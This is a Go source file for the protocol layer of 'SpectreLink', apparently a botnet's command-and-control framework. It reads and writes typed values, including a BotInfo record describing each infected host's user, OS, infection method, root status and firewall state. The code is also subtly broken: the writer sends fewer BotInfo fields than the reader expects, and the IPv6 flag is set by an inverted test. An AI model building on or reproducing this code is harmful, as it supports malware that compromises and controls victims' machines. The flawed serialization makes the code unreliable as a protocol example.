package proto

import (
	"SpectreLink/log"
	"encoding/binary"
	"errors"
	"io"
	"net"
	"net/url"
	"time"
)

func writeInt32(conn *Connection, val int32) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeInt64(conn *Connection, val int64) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeInt16(conn *Connection, val int16) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeString(conn *Connection, val string) error {
	return writeBinary(conn, []byte(val))
}

func writeBool(conn *Connection, val bool) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeFloat(conn *Connection, val float32) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeDouble(conn *Connection, val float64) error {
	return binary.Write(conn, conn.ByteCode.Order(), val)
}

func writeStringMap(conn *Connection, val map[string]string) error {
	if err := writeInt32(conn, int32(len(val))); err != nil {
		return err
	}

	for k, v := range val {
		log.Infof("Key: %s, Value: %s", k, v)
		if err := writeString(conn, k); err != nil {
			return err
		}
		if err := writeString(conn, v); err != nil {
			return err
		}
	}

	return nil
}

func writeStringArray(conn *Connection, val []string) error {
	if err := writeInt32(conn, int32(len(val))); err != nil {
		return err
	}

	for _, v := range val {
		if err := writeString(conn, v); err != nil {
			return err
		}
	}

	return nil
}

func writeBinary(conn *Connection, val []byte) error {
	if err := writeInt32(conn, int32(len(val))); err != nil {
		return err
	}

	if n, err := conn.Write(val); err != nil {
		return err
	} else if n != len(val) {
		return errors.New("failed to write binary")
	}

	return nil
}

func readInt32(conn *Connection) (val int32, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return 0, err
	}
	return val, nil
}

func readInt64(conn *Connection) (val int64, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return 0, err
	}
	return val, nil
}

func readInt16(conn *Connection) (val int16, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return 0, err
	}
	return val, nil
}

func readString(conn *Connection) (val string, err error) {
	size, err := readInt32(conn)
	if err != nil {
		return "", err
	}

	buf := make([]byte, size)
	_, err = io.ReadFull(conn, buf)
	if err != nil {
		return "", err
	}

	return string(buf), nil
}

func readBool(conn *Connection) (val bool, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return false, err
	}
	return val, nil
}

func readFloat(conn *Connection) (val float32, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return 0, err
	}
	return val, nil
}

func readDouble(conn *Connection) (val float64, err error) {
	if err = binary.Read(conn, conn.ByteCode.Order(), &val); err != nil {
		return 0, err
	}
	return val, nil
}

func readStringMap(conn *Connection) (val map[string]string, err error) {
	size, err := readInt32(conn)
	if err != nil {
		return nil, err
	}

	val = make(map[string]string, size)
	for i := 0; i < int(size); i++ {
		key, err := readString(conn)
		if err != nil {
			return nil, err
		}
		value, err := readString(conn)
		if err != nil {
			return nil, err
		}
		val[key] = value
	}

	return val, nil
}

func readStringArray(conn *Connection) (val []string, err error) {
	size, err := readInt32(conn)
	if err != nil {
		return nil, err
	}

	val = make([]string, size)
	for i := 0; i < int(size); i++ {
		val[i], err = readString(conn)
		if err != nil {
			return nil, err
		}
	}

	return val, nil
}

func readBinary(conn *Connection) (val []byte, err error) {
	size, err := readInt32(conn)
	if err != nil {
		return nil, err
	}

	val = make([]byte, size)
	_, err = io.ReadFull(conn, val)
	if err != nil {
		return nil, err
	}

	return val, nil
}

func writeData(conn *Connection, val interface{}) error {
	switch v := val.(type) {
	case int16:
		return writeInt16(conn, v)
	case int32:
		return writeInt32(conn, v)
	case int64:
		return writeInt64(conn, v)
	case string:
		return writeString(conn, v)
	case bool:
		return writeBool(conn, v)
	case float32:
		return writeFloat(conn, v)
	case float64:
		return writeDouble(conn, v)
	case map[string]string:
		return writeStringMap(conn, v)
	case []string:
		return writeStringArray(conn, v)
	case []byte:
		return writeBinary(conn, v)
	case time.Duration:
		return writeInt64(conn, v.Milliseconds())
	case *url.URL:
		return writeString(conn, v.String())
	case net.IP:
		return writeIpAddr(conn, v)
	case BotInfo:
		return writeBotInfo(conn, v)
	default:
		return errors.New("unknown data type")
	}
}

func readData(conn *Connection, argType ArgType) (interface{}, error) {
	switch argType {
	case ArgTypeInt16:
		return readInt16(conn)
	case ArgTypeInt32:
		return readInt32(conn)
	case ArgTypeInt64:
		return readInt64(conn)
	case ArgTypeString:
		return readString(conn)
	case ArgTypeBool:
		return readBool(conn)
	case ArgTypeFloat:
		return readFloat(conn)
	case ArgTypeDouble:
		return readDouble(conn)
	case ArgTypeStringMap:
		return readStringMap(conn)
	case ArgTypeStringList:
		return readStringArray(conn)
	case ArgTypeBinary:
		return readBinary(conn)
	case ArgTypeDuration:
		return readInt64(conn)
	case ArgTypeURL:
		return readString(conn)
	case ArgTypeIP:
		return readIpAddr(conn)
	case ArgTypeBotInfo:
		return readBotInfo(conn)
	default:
		return nil, errors.New("unknown data type")
	}
}

func readBotInfo(conn *Connection) (*BotInfo, error) {
	var err error

	botInfo := &BotInfo{}
	botInfo.Username, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.OS, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.Kernel, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.Arch, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.Version, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.InfectionMethod, err = readString(conn)
	if err != nil {
		return nil, err
	}
	botInfo.Processors, err = readInt32(conn)
	if err != nil {
		return nil, err
	}
	botInfo.UpTime, err = readInt32(conn)
	if err != nil {
		return nil, err
	}
	botInfo.TotalMemory, err = readFloat(conn)
	if err != nil {
		return nil, err
	}
	botInfo.FreeMemory, err = readFloat(conn)
	if err != nil {
		return nil, err
	}
	botInfo.TimeZoneDiff, err = readDouble(conn)
	if err != nil {
		return nil, err
	}
	botInfo.SystemTime, err = readInt64(conn)
	if err != nil {
		return nil, err
	}
	botInfo.IsRoot, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.LittleEndian, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.Is64Bit, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.IsDebugMode, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.IsIPv6Supported, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.HasAnySSLLib, err = readBool(conn)
	if err != nil {
		return nil, err
	}
	botInfo.FirewallStatus, err = readBool(conn)
	if err != nil {
		return nil, err
	}

	return botInfo, nil
}

func readIpAddr(conn *Connection) (interface{}, error) {
	isV6, err := readBool(conn)
	if err != nil {
		return nil, err
	}

	addr, err := readString(conn)
	if err != nil {
		return nil, err
	}

	if isV6 {
		return net.ParseIP(addr).To16(), nil
	}

	return net.ParseIP(addr), nil
}

func writeIpAddr(conn *Connection, v net.IP) error {
	if err := writeBool(conn, v.To16() == nil); err != nil {
		return err
	}

	if err := writeString(conn, v.String()); err != nil {
		return err
	}

	return nil
}

func writeBotInfo(conn *Connection, v BotInfo) error {
	if err := writeString(conn, v.Username); err != nil {
		return err
	}
	if err := writeString(conn, v.OS); err != nil {
		return err
	}
	if err := writeString(conn, v.Kernel); err != nil {
		return err
	}
	if err := writeString(conn, v.Arch); err != nil {
		return err
	}
	if err := writeString(conn, v.Version); err != nil {
		return err
	}
	if err := writeString(conn, v.InfectionMethod); err != nil {
		return err
	}
	if err := writeInt32(conn, v.Processors); err != nil {
		return err
	}
	if err := writeInt32(conn, v.UpTime); err != nil {
		return err
	}
	if err := writeFloat(conn, v.TotalMemory); err != nil {
		return err
	}
	if err := writeFloat(conn, v.FreeMemory); err != nil {
		return err
	}
	if err := writeDouble(conn, v.TimeZoneDiff); err != nil {
		return err
	}
	if err := writeInt64(conn, v.SystemTime); err != nil {
		return err
	}
	if err := writeBool(conn, v.IsRoot); err != nil {
		return err
	}
	if err := writeBool(conn, v.LittleEndian); err != nil {
		return err
	}
	return nil
}
